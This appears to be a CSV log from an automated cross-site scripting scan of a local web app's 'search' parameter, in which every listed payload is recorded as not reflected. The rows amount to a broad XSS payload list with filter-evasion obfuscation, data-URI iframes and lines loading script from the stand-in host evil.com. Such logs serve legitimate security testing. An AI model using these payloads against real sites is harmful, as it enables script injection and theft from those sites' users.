Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div title=""test"" onmouseover=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img alt=""test"" src=x onerror=alert(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<blockquote cite=javascript:alert(1)>X</blockquote>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img longdesc=javascript:alert(1) src=x>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img ismap src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input dirname=test onchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert&#40;1&#41;</script></svg>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert&#x28;1&#x29;</script></svg>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>&#97;lert(1)</script></svg>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""xss:expression(alert(1))"">X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""background:expression(alert(1))"">X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<image src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<isindex type=submit value=X onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<bgsound src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<applet code=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>al\u0065rt(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>al\x65rt(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('al'+'ert(1)')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('al\x65rt(1)')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>[1].find(alert)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>top['al'+'ert'](1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>top[/al/.source+/ert/.source](1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>top[8680439..toString(30)](1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,&lt;script&gt;alert(1)&lt;/script&gt;,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,&#60;script&#62;alert(1)&#60;/script&#62;,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script/src=//evil.com></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script	src=//evil.com></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,src=//evil.com></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<template><slot onfocus=alert(1) autofocus></slot></template>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=text onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=password onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=email onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=number onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=search onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=tel onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=url onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=date onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=time onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=datetime-local onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=month onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=week onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=color onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=range onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=button onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=reset onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=submit onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<datalist onmouseover=alert(1)>X</datalist>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<keygen onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<keygen onchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<custom-element onclick=alert(1)>X</custom-element>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img srcset=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<source srcset=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img crossorigin=anonymous src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script crossorigin=anonymous src=x onerror=alert(1)></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img loading=lazy src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img decoding=async src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img importance=high src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onabort=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onwaiting=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onseeking=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onseeked=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onplaying=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onplay=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onpause=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onloadstart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onloadedmetadata=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onloadeddata=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onended=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondurationchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncanplaythrough=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncanplay=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<root><![CDATA[<script>alert(1)</script>]]></root>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.domain)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.location)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(navigator.userAgent)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(localStorage.getItem('test'))</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(sessionStorage.getItem('test'))</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>'alert\u0028document.domain\u0029'</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.name)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.safari)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.chrome)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<blink onmouseover=alert(1)>X</blink>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<acronym onmouseover=alert(1)>X</acronym>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<big onmouseover=alert(1)>X</big>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<center onmouseover=alert(1)>X</center>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dir onmouseover=alert(1)>X</dir>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<font onmouseover=alert(1)>X</font>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<frame onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<frameset onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<noframes onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<strike onmouseover=alert(1)>X</strike>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<tt onmouseover=alert(1)>X</tt>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1);alert(2);alert(3)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>for(i=0;i<3;i++){alert(i)}</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>while(1){alert(1);break}</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>if(1){alert(1)}</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>try{alert(1)}catch(e){}</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)||alert(2)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)&&alert(2)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)?alert(2):alert(3)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert([1,2,3])</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert({x:1,y:2})</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(function(){return 1}())</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert((()=>1)())</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(class{constructor(){return 1}})</script>,NO_REFLECTION,No,,Info
